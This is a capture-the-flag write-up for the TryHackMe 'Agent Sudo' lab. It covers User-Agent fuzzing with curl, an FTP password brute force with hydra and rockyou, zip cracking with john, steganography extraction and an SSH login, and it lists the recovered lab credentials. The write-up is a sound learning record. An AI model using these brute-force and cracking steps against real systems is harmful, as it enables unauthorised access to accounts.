# CTF Writeup — Agent Sudo (TryHackMe)

  

## Overview

Multi-step CTF involving web enumeration, custom HTTP headers, FTP brute force, steganography, and SSH access.

  

**Services found:**

- Port 21 — FTP (vsftpd 3.0.3)

- Port 22 — SSH (OpenSSH 7.6p1)

- Port 80 — HTTP (Apache 2.4.29)

  

---

  

## Step 1 — Nmap

  

```bash

nmap -sV -sC <IP>

```

  

---

  

## Step 2 — Web Enumeration (Port 80)

  

Visited the site. Page source said:

> "Use your own **codename** as user-agent to access the site. — Agent R"

  

Brute forced all single letters A–Z as User-Agent headers to find which agent's page responds differently:

  

```bash

default=$(curl -sL -A "default" http://<IP>)

  

for letter in {A..Z}; do

    response=$(curl -sL -A "$letter" http://<IP>)

    if [ "$response" != "$default" ]; then

        echo "=== DIFFERENT RESPONSE for: $letter ==="

        echo "$response"

    fi

done

```

  

**Result:** Agent `C` revealed a message exposing:

- Username: `chris`

- Hint: password is weak

  

---

  

## Step 3 — FTP Brute Force

  

Used hydra to brute force FTP with the discovered username:

  

```bash

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP>

```

  

Logged in and downloaded all files:

  

```bash

ftp <IP>

# login: chris / <cracked password>

ls

get <filename>

```

  

Files found on FTP:

- `cutie.png`

- `cute-alien.jpg`

- `To_AgentJ.txt` (or similar)

  

---

  

## Step 4 — Steganography on cutie.png

  

### Binwalk — extract hidden files

  

```bash

binwalk -e cutie.png

# Creates folder: _cutie.png.extracted/

```

  

Found a zip inside: `8702.zip`

  

### Crack the zip password

  

```bash

zip2john _cutie.png.extracted/8702.zip > zip.hash

john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

```

  

**Password found:** `alien`

  

### Extract the zip

  

```bash

cd _cutie.png.extracted/

7z x 8702.zip -palien

cat To_agentR.txt

```

  

Message contained a Base64 string: `QXJlYTUx`

  

### Decode Base64

  

```bash

echo "QXJlYTUx" | base64 -d

# Output: Area51

```

  

---

  

## Step 5 — Steganography on cute-alien.jpg

  

Used `steghide` with the decoded passphrase:

  

```bash

steghide extract -sf cute-alien.jpg

# Passphrase: Area51

```

  

Extracted file revealed:

- Username: `james`

- Password: `hackerrules!`

  

---

  

## Step 6 — SSH Access

  

```bash

ssh james@<IP>

# Password: hackerrules!

  

ls

cat user.txt   # user flag

```

  

### Download files from SSH

  

```bash

scp james@<IP>:Alien_autospy.jpg .

```

  

---

  

## Tools Used

  

| Tool | Purpose |

|------|---------|

| `nmap` | Port scanning |

| `curl -A` | Custom User-Agent requests |

| `hydra` | FTP brute force |

| `binwalk` | Extract hidden files from images |

| `zip2john` + `john` | Crack zip password |

| `7z` | Extract encrypted zip/7z |

| `steghide` | Extract hidden data from jpg |

| `base64` | Decode encoded strings |

| `scp` | Download files over SSH |

  

---

  

## Key Lessons

  

- Always check HTTP response changes when fuzzing headers, not just page content

- `binwalk -e` is the easiest way to extract hidden files from images

- Base64 strings in CTFs almost always decode to passwords or locations

- "Weak password" hint = run rockyou.txt with hydra

- Steghide needs a passphrase — look for it in other files/clues

- Follow the chain: web → FTP → stego → SSH

  

---

  

## Credentials Found

  

| Service | Username | Password |

|---------|----------|----------|

| FTP | chris | *(cracked by hydra)* |

| SSH | james | hackerrules! |